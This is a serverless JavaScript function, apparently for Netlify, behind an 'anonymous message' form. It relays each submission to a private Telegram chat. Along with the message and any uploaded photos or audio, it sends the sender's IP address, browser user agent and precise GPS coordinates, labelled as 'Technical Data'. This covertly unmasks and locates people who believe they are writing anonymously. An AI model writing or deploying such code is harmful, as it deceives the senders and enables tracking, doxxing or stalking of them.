const multipart = require('lambda-multipart-parser');
const fetch = require('node-fetch');
const FormData = require('form-data');

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const result = await multipart.parse(event);
        const { message, name, emoji, latitude, longitude } = result; // Extract new latitude/longitude
        const files = result.files;

        const botToken = process.env.TELEGRAM_BOT_1_TOKEN;
        const chatId = process.env.TELEGRAM_BOT_1_CHAT_ID;

        const ip = event.headers['x-nf-client-connection-ip'] || 'N/A';
        const userAgent = event.headers['user-agent'] || 'N/A';
        const network = 'Unknown'; // We don't have a way to reliably get this from client-side or headers without external service

        // 1. Format and send the main text message
        let textCaption = `🔵 *New Anonymous Message* 🔵\n\n`;
        textCaption += `*From:* ${name}\n`;
        textCaption += `*Reaction:* ${emoji}\n\n`;
        textCaption += `*Message:*\n${message}\n\n`;
        textCaption += `--- *Technical Data* ---\n`;
        textCaption += `*IP Address:* \`${ip}\`\n`;
        textCaption += `*Device/Browser:* \`${userAgent}\`\n`;
        textCaption += `*Network:* \`${network}\`\n`; // Added network field

        // Removed the text-based Precise Location as sendLocation will handle the visual part
        // if (latitude && longitude) {
        //     const googleMapsLink = `http://maps.google.com/maps?q=${latitude},${longitude}`;
        //     textCaption += `*Precise Location:* [View on Google Maps](${googleMapsLink})\n`;
        // } else {
        //     textCaption += `*Precise Location:* Not shared (or permission denied)\n`;
        // }


        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: textCaption, parse_mode: 'Markdown' }),
        });

        // --- NEW: Send the precise location as a Telegram location message ---
        if (latitude && longitude) {
            await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    latitude: parseFloat(latitude), // Ensure they are numbers
                    longitude: parseFloat(longitude),
                    live_period: undefined // Not a live location, just a point
                }),
            });
        }


        // 2. Now, send each file one by one
        for (const file of files) {
            const form = new FormData();
            form.append('chat_id', chatId);

            // Check if it's a photo or audio and use the correct endpoint
            if (file.contentType.startsWith('image/')) {
                form.append('photo', file.content, { filename: file.filename });
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: form
                });
            } else if (file.contentType.startsWith('audio/')) {
                form.append('audio', file.content, { filename: file.filename });
                await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                    method: 'POST',
                    body: form
                });
            }
        }

        return { statusCode: 200, body: JSON.stringify({ success: true }) };

    } catch (error) {
        console.error("Error in function:", error);
        return { statusCode: 500, body: JSON.stringify({ error: 'Internal Server Error' }) };
    }
};
